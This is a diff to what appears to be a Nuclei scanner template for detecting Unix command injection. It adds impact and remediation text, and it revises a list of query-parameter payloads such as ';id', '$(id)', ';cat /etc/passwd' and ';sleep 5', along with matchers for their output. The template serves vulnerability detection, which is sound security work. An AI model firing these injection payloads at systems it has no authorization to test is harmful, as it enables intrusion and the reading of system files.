@@ -1,83 +1,80 @@
 id: unix-command-injection
 
 info:
-  name: Unix Command Injection - Generic Fuzz Detection
+  name: Unix Command Injection - Generic Detection
   author: Jaenact
   severity: high
   description: |
-    Replaces query parameter values with command-separator payloads (e.g., ;, |, &&, backticks, $(..))
-    and detects possible OS command execution on Unix/Linux targets by matching id/whoami output,
-    /etc/passwd indicators, directory listings, or time-based delays.
-    Note: requires running nuclei with -fuzz and a target URL that includes at least one query parameter.
+    Detected potential Unix/Linux OS command injection by replacing query parameter values with shell separator payloads and identifying successful command execution through command output patterns or response time delays. Payloads included semicolons, pipes, logical AND operators, backticks, command substitution, and newline injection.
+  impact: |
+    Successful exploitation allows arbitrary command execution on the underlying operating system, leading to full server compromise, data exfiltration, lateral movement, and denial of service.
+  remediation: |
+    Never pass user-controlled input directly to shell commands. Use parameterized APIs or language-native functions instead of system()/exec(). Apply strict allowlist input validation and enforce least-privilege execution contexts for application processes.
   reference:
     - https://owasp.org/www-community/attacks/Command_Injection
     - https://cwe.mitre.org/data/definitions/78.html
     - https://capec.mitre.org/data/definitions/88.html
+    - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
   classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
     cwe-id: CWE-78
   metadata:
     verified: true
-    max-request: 1
-  tags: dast,injection,rce,command-injection,unix,linux,intrusive
+    max-request: 15
+  tags: cmdi,dast,rce,unix,linux,fuzz,vuln
 
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
 
     payloads:
-      unix_fuzz:
-        - ';id'
-        - '|id'
-        - '&id'
-        - '&&id'
-        - '`id`'
-        - '$(id)'
-        - ';whoami'
-        - '|whoami'
-        - '&&whoami'
-        - ';cat /etc/passwd'
-        - '|cat /etc/passwd'
-        - '&&cat /etc/passwd'
-        - ';ls -la'
-        - '|ls -la'
-        - '%0Aid'
-        - '%0Awhoami'
-        - '%0Acat%20/etc/passwd'
-        - ';sleep 5'
-        - '|sleep 5'
-        - '&&sleep 5'
-        - '`sleep 5`'
+      injection:
+        # shell separators with id
+        - ";id"
+        - "|id"
+        - "&&id"
+        - "`id`"
+        - "$(id)"
+        # file read
+        - ";cat /etc/passwd"
+        - "|cat /etc/passwd"
+        - "$(cat /etc/passwd)"
+        # newline injection
+        - "%0aid"
+        - "%0acat+/etc/passwd"
+        # time-based
+        - ";sleep 5"
+        - "|sleep 5"
+        - "&&sleep 5"
+        - "$(sleep 5)"
+        - "`sleep 5`"
 
     fuzzing:
       - part: query
         type: replace
-        mode: multiple
+        mode: single
         fuzz:
-          - '{{unix_fuzz}}'
+          - "{{injection}}"
 
     stop-at-first-match: true
     matchers-condition: or
     matchers:
       - type: regex
-        name: unix-id-output
+        name: id-output
         part: body
         regex:
-          - '(?m)\\buid=\\d+\\([^)]+\\)\\b'
+          - 'uid=\d+\([^)]+\)\s+gid=\d+'
 
       - type: regex
-        name: unix-passwd-content
+        name: etc-passwd
         part: body
         regex:
-          - '(?m)^root:.*?:[0-9]+:[0-9]+:'
-
-      - type: regex
-        name: unix-ls-output
-        part: body        
-        regex:
-          - '(?m)^\\s*total\\s+\\d+\\s*$'
+          - 'root:.*:0:0:'
 
       - type: dsl
-        name: time-based-unix
+        name: time-based
         dsl:
           - 'duration >= 4'
